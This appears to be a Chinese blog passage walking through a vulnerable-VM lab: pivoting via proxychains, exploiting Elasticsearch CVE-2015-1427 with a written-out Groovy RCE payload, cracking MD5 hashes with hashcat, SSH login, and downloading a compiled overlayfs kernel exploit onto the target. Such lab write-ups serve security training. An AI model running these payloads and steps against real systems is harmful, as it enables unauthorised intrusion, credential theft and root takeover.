+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT 172.17.0.1</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.<br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 21:59 EDT<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:993 &lt;--socket error or timeout!<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:443 &lt;--socket error or timeout!<br>[......]<br>Nmap scan report for 172.17.0.1 (172.17.0.1)<br>Host is up (0.012s latency).<br>Not shown: 998 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5000/tcp open  upnp<br><br>Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p22,5000 172.17.0.1</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.<br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 22:02 EDT<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK<br>[......]<br>Nmap scan report for 172.17.0.1 (172.17.0.1)<br>Host is up (0.012s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)<br>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds<br></code></pre></td></tr></table></figure>
+<p>它也开放着 22 和 5000 端口，给 kali 的浏览器配置 socks5 代理，看看这个 172.17.0.1 的 5000 端口是什么，发现和 docker 1 一样。</p>
+<p>M1 直接给 kali 的浏览器配置代理：设置里配置代理</p>
+<p>M2 使用 proxychains4 给 firefox 配置代理：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 firefox</span><br></code></pre></td></tr></table></figure>
+<p>M3 使用 curl：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl http://172.17.0.1:5000</span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl http://172.17.0.1:5000/admin</span><br></code></pre></td></tr></table></figure>
+<p>这意味着，172.17.0.1 是192.168.135.151 的宿主机，只不过 172.17.0.1 是宿主机面向内网的 ip。</p>
+<blockquote>
+<p>如果这让你感到难以理解，可以换个说法，你一定碰到过这中情况，你希望把自己物理机上的某个文件丢到虚拟机中，但是 vmware-tools 失效了，你无法直接把文件拖动到虚拟机里面。于是你在物理机上使用 python 或者别的什么工具开启了一个 web 服务，然后你在虚拟机就可以下载文件了。但是你在虚拟机的浏览器中输入的，一定是 x.x.x.1，因为这个地址才是物理机可以与虚拟机交互的地址。</p>
+</blockquote>
+<p>考虑到当初拿 shell 的时候，就没看到什么有价值的信息，估计就算拿下 172.17.0.1 也是如此。在主机发现的时候，172.17.0.2 也是存活主机，看看它有没有什么有趣的信息。</p>
+<p><strong>扫描其他主机：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT 172.17.0.2</span><br>Nmap scan report for 172.17.0.2 (172.17.0.2)<br>Host is up (0.0096s latency).<br>Not shown: 999 closed ports<br>PORT     STATE SERVICE<br>9200/tcp open  wap-wsp<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p9200 172.17.0.2</span><br>Nmap scan report for 172.17.0.2<br>Host is up (0.014s latency).<br><br>PORT     STATE SERVICE VERSION<br>9200/tcp open  http    Elasticsearch REST API 1.4.2 (name: Damon Dran; cluster: elasticsearch; Lucene 4.10.2)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds<br></code></pre></td></tr></table></figure>
+<p>发现这个 ip 上跑着 Elasticsearch 服务，百度一下发现这个服务曾经爆出过 RCE 漏洞，那我们就试试，看能不能拿下这台主机。</p>
+<h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>搜索漏洞库，发现存在 RCE 利用文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Elasticsearch</span><br>----------------------- ---------------------------------<br> Exploit Title         |  Path<br>----------------------- ---------------------------------<br>ElasticSearch - Remote | linux/remote/36337.py<br>ElasticSearch - Remote | multiple/webapps/33370.html<br>----------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/exploitdb/exploits/linux/remote/36337.py ./</span><br></code></pre></td></tr></table></figure>
+<p>看了下代码，发现是 python2 写的，运行脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 python2 36337.py 172.17.0.2</span>  <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>                                                                       <br> Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                         <br>&#123;*&#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something<br><span class="hljs-meta">~$</span><span class="bash"> id</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>Traceback (most recent call last):<br>  File &quot;36337.py&quot;, line 56, in &lt;module&gt;<br>    main(args=sys.argv)<br>  File &quot;36337.py&quot;, line 53, in main<br>    exploit(target=args[1])<br>  File &quot;36337.py&quot;, line 47, in exploit<br>    execute_command(target=target, command=cmd)<br>  File &quot;36337.py&quot;, line 36, in execute_command<br>    fuckingjson = values[&#x27;hits&#x27;][&#x27;hits&#x27;][0][&#x27;fields&#x27;][&#x27;lupin&#x27;][0]<br>IndexError: list index out of range<br></code></pre></td></tr></table></figure>
+<h4 id="利用失败"><a href="#利用失败" class="headerlink" title="利用失败"></a>利用失败</h4><blockquote>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/GALi_233/article/details/119841078">https://blog.csdn.net/GALi_233/article/details/119841078</a></p>
+</blockquote>
+<p>尝试利用，发现失败，随后我又通过 MSF 的 exp 进行利用，也失败，于是又手动提交 payload 发现还是不行 。</p>
+<p>该漏洞利用需要至少一条数据，否则无法利用成功，原因是服务里面没有数据，所以不能通过 search 来搜索进而执行命令，</p>
+<p>插入一条数据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -X POST <span class="hljs-string">&#x27;http://172.17.0.3:9200/doc/test&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;name&quot; : &quot;test&quot;&#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;&quot;_index&quot;:&quot;doc&quot;,&quot;_type&quot;:&quot;test&quot;,&quot;_id&quot;:&quot;AYHDq6TBj_Czxl86lzH3&quot;,&quot;_version&quot;:1,&quot;created&quot;:true&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/twitter/user/yren&#x27;</span> -d <span class="hljs-string">&#x27;&#123; &quot;name&quot; : &quot;Wu&quot; &#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;&quot;_index&quot;:&quot;twitter&quot;,&quot;_type&quot;:&quot;user&quot;,&quot;_id&quot;:&quot;yren&quot;,&quot;_version&quot;:1,&quot;created&quot;:true&#125;    <br></code></pre></td></tr></table></figure>
+<p>再次执行 Payload，成功执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/_search?pretty&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;script_fields&quot;: &#123;&quot;payload&quot;: &#123;&quot;script&quot;:&quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;whoami\&quot;).getText()&quot;&#125;&#125;&#125;&#x27;</span></span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;took&quot; : 9,<br>  &quot;timed_out&quot; : false,<br>  &quot;_shards&quot; : &#123;<br>    &quot;total&quot; : 10,<br>    &quot;successful&quot; : 10,<br>    &quot;failed&quot; : 0<br>  &#125;,<br>  &quot;hits&quot; : &#123;<br>    &quot;total&quot; : 2,<br>    &quot;max_score&quot; : 1.0,<br>    &quot;hits&quot; : [ &#123;<br>      &quot;_index&quot; : &quot;twitter&quot;,<br>      &quot;_type&quot; : &quot;user&quot;,<br>      &quot;_id&quot; : &quot;yren&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;payload&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125;, &#123;<br>      &quot;_index&quot; : &quot;doc&quot;,<br>      &quot;_type&quot; : &quot;test&quot;,<br>      &quot;_id&quot; : &quot;AYHDq6TBj_Czxl86lzH3&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;payload&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125; ]<br>  &#125;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains4 curl -XPOST <span class="hljs-string">&#x27;http://172.17.0.3:9200/_search?pretty&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;whoami\&quot;).getText()&quot;&#125;&#125;&#125;&#x27;</span></span>   <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;took&quot; : 60,<br>  &quot;timed_out&quot; : false,<br>  &quot;_shards&quot; : &#123;<br>    &quot;total&quot; : 10,<br>    &quot;successful&quot; : 10,<br>    &quot;failed&quot; : 0<br>  &#125;,<br>  &quot;hits&quot; : &#123;<br>    &quot;total&quot; : 2,<br>    &quot;max_score&quot; : 1.0,<br>    &quot;hits&quot; : [ &#123;<br>      &quot;_index&quot; : &quot;twitter&quot;,<br>      &quot;_type&quot; : &quot;user&quot;,<br>      &quot;_id&quot; : &quot;yren&quot;,<br>      &quot;_score&quot; : 1.0,<br>      &quot;fields&quot; : &#123;<br>        &quot;lupin&quot; : [ &quot;root\n&quot; ]<br>      &#125;<br>    &#125; ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>再次尝试 RCE 脚本，成功了。这次依然拿到的是 docker 2 的 root 权限，检查发现 passwords 文件 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 python2 36337.py 172.17.0.2</span>                                                 <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br><br> Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1                                                         <br>&#123;*&#125; Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something<br><span class="hljs-meta">~$</span><span class="bash"> id</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">~$</span><span class="bash"> whoami</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>root<br><span class="hljs-meta">~$</span><span class="bash"> ls</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>[......]<br>passwords<br>[......]<br><span class="hljs-meta">~$</span><span class="bash"> cat passwords</span><br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK<br>Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase<br>Example: 1234abcd<br>john:3f8184a7343664553fcb5337a3138814 <br>test:861f194e9d6118f3d942a72be3e51749<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b<br>root:b3d34352fc26117979deabdf1b9b6354<br>jane:5c158b60ed97c723b673529b8a3cf72b<br></code></pre></td></tr></table></figure>
+<p>提示我们使用 hashcat 破解 hash 值，Format 就是模板，先把 hash 提取出来，保存为一个文件 。</p>
+<p>Hashcat 破解：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164507.html">密码破解全能工具：Hashcat密码破解攻略 - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat pwd.hash</span> <br>3f8184a7343664553fcb5337a3138814<br>861f194e9d6118f3d942a72be3e51749<br>670c3bbc209a18dde5446e5e6c1f1d5b<br>b3d34352fc26117979deabdf1b9b6354<br>5c158b60ed97c723b673529b8a3cf72b                                                                                                                                            <br><span class="hljs-meta">#</span><span class="bash"> -m 0 指哈希类型是md5 ， -a 3 指掩码攻击，根据提示，前四位为数字，后四位为小写字母，?d代表数字，?l代表小写字母</span><br><span class="hljs-meta">$</span><span class="bash"> hashcat -m 0 -a 3 pwd.hash ?d?d?d?d?l?l?l?l --force</span><br>hashcat (v6.1.1) starting...<br><br>5c158b60ed97c723b673529b8a3cf72b:1234jane        <br>b3d34352fc26117979deabdf1b9b6354:1234pass        <br>670c3bbc209a18dde5446e5e6c1f1d5b:1111pass        <br>3f8184a7343664553fcb5337a3138814:1337hack        <br>861f194e9d6118f3d942a72be3e51749:1234test      <br></code></pre></td></tr></table></figure>
+<p>很快就破解出来了：</p>
+<blockquote>
+<p>网站破解：<a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a> or <a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase<br>Example: <span class="hljs-number">1234</span>abcd<br>john:<span class="hljs-number">3</span>f8184a7343664553fcb5337a3138814:<span class="hljs-number">1337</span>hack<br>test:<span class="hljs-number">861</span>f194e9d6118f3d942a72be3e51749:<span class="hljs-number">1234</span>test<br>admin:<span class="hljs-number">670</span>c3bbc209a18dde5446e5e6c1f1d5b:<span class="hljs-number">1111</span>pass<br>root:b3d34352fc26117979deabdf1b9b6354:<span class="hljs-number">1234</span>pass<br>jane:<span class="hljs-number">5</span>c158b60ed97c723b673529b8a3cf72b:<span class="hljs-number">1234</span>jane<br></code></pre></td></tr></table></figure>
+<h4 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h4><p>经过测试，只有 john 可以登录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh john@192.168.135.151</span>         <br>john@192.168.135.151&#x27;s password: <br>Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)<br><br>john@socnet:~$ whoami<br>john<br>john@socnet:~$ id<br>uid=1001(john) gid=1001(john) groups=1001(john)<br></code></pre></td></tr></table></figure>
+<p>查看 sudo：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ sudo -l<br>[sudo] password for john: <br>Sorry, user john may not run sudo on socnet.<br></code></pre></td></tr></table></figure>
+<p>查看 SUID：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> ls -ldb &#123;&#125; ;</span><br><br>john@socnet:~$ find / -perm -u=s -type f 2&gt;/dev/null<br>[......]<br>/usr/bin/chsh<br>/usr/bin/pkexec<br>/usr/bin/gpasswd<br>[......]<br></code></pre></td></tr></table></figure>
+<p>查看 passwd：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>socnet:x:1000:1000:socnet,,,:/home/socnet:/bin/bash<br>john:x:1001:1001:john,,,:/home/john:/bin/bash<br></code></pre></td></tr></table></figure>
+<h3 id="2、内核提权"><a href="#2、内核提权" class="headerlink" title="2、内核提权"></a>2、内核提权</h3><p>检查内核信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /etc/version<br>$ lsb_release -a<br>john@socnet:~$ uname -a<br>Linux socnet 3.13.0-24-generic <span class="hljs-comment">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>
+<p>使用 searchsploit 看看有没有提权 EXP：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit linux 3.13.0 ubuntu Privilege Escalation</span><br>---------------------------------------------------------------------------------------------------------- -<br>Exploit Title                                                                                            |  Path<br>---------------------------------------------------------------------------------------------------------- -<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;overlayfs&#x27; Local Privilege Escalation      | linux/local/37292.c<br>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;overlayfs&#x27; Local Privilege Escalation (Acc | linux/local/37293.txt<br>Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;CONFIG_X86_X32=y&#x27; Local Privilege Escalation (3)    | linux_x86-64/local/31347.c<br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                             | linux/local/45010.c<br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                    | linux/local/44298.c<br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;netfilter target_offset&#x27; Local Privilege Escalation         | linux_x86-64/local/44300.c<br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)     | linux/local/43418.c<br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalatio | linux/local/47169.c<br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                    | linux/local/41760.txt<br>---------------------------------------------------------------------------------------------------------- -<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+<p>选择 37292.c 来利用，查看靶机有没有 gcc：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ gcc --version<br>The program &#x27;gcc&#x27; is currently not installed. To run &#x27;gcc&#x27; please ask your administrator to install the package &#x27;gcc&#x27;<br></code></pre></td></tr></table></figure>
+<p>发现没有 gcc ，尝试在本地编译之后再传至靶机：</p>
+<blockquote>
+<p>没有权限在线安装 gcc，也无法离线安装，没有 rpm 命令</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc 37292.c -o ofs</span>                                                                       <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span>      <br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [02/Jul/2022 00:31:01] &quot;GET /ofs HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure>
+<p>靶机下载、运行文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ wget http://192.168.135.141:8888/ofs<br><br>john@socnet:~$ ls<br>ofs<br>john@socnet:~$ ./ofs<br>-bash: ./ofs: Permission denied<br>john@socnet:~$ chmod +x ofs<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br>sh: 1: gcc: not found<br>couldn&#x27;t create dynamic library<br></code></pre></td></tr></table></figure>
+<p>运行后发现 gcc 报错，也意味着代码中含有 gcc 命令，查看源码，发现执行了一条命令用来编译生成 ofs-lib.so 文件，然后往上找，可以找到 LIB 变量的内容 。</p>
